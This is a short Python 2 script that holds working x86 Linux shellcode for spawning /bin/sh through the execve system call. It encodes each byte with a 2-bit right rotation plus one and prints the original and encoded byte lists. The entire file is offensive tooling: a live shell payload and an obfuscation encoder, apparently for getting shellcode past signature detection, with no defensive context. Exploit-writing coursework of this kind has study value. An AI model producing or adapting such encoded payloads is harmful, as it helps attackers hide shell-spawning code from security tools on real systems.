#!/usr/bin/python

#below is the shellcode for /bin/sh using execve sys call
shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

t=[]
w=[]
z=[]

ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))
 


for i in range(0, len(shellcode)):
	s = ord(shellcode[i])
	y = ror(s,2,8)
	b = y+1
	w.append(s)
	t.append(y)
	z.append(b)

	
print "length %d" %len(t)

print "[+] Original shellcode..:", (", ".join(hex(c) for c in w[0::]))
print "[+] ROR shellcode..:", (", ".join(hex(c) for c in t[0::]))
print "[+] ROR shellcode after adding 1 to each byte ..:", (", ".join(hex(c) for c in z[0::]))

 

